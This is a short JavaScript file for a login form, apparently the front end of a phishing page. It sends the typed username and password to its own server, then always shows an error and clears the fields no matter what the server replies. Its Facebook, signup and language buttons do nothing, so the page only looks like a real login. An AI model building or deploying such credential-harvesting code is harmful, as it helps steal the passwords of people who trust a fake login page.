
const loginBtn = document.getElementById('loginBtn');
const usernameInput = document.getElementById('usernameInput');
const passwordInput = document.getElementById('passwordInput');
const errorMsg = document.getElementById('errorMsg');

function checkInputs() {
  loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
}
usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

loginBtn.addEventListener('click', function() {
  const body = 'usernameInput='+encodeURIComponent(usernameInput.value)+'&passwordInput='+encodeURIComponent(passwordInput.value);
  fetch('/', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:body});
  errorMsg.style.display = 'block';
  usernameInput.value=''; passwordInput.value=''; checkInputs();
});

document.getElementById('fbBtn').addEventListener('click',function(){});
document.getElementById('signupLink').addEventListener('click',function(e){e.preventDefault();});
document.getElementById('langBtn').addEventListener('click',function(){});

